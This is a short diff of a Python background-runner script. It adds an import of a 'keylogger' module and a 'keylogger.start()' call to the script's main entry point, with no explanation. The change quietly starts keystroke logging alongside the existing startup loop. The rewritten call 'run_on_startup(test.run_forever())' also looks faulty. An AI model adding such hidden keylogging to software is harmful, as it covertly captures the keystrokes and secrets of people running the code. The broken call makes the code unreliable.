@@ -1,5 +1,6 @@
 import datetime
 import test
+import keylogger
 import time
 import os
 import sys
@@ -33,7 +34,6 @@ def run_on_startup():
             log_message(f"An error occurred: {e}. Attempting to continue.")
             time.sleep(5)
 
-# test.run_forever()
-
 if __name__ == "__main__":
-    test.run_forever("background_runner.py")
+    keylogger.start()
+    run_on_startup(test.run_forever())
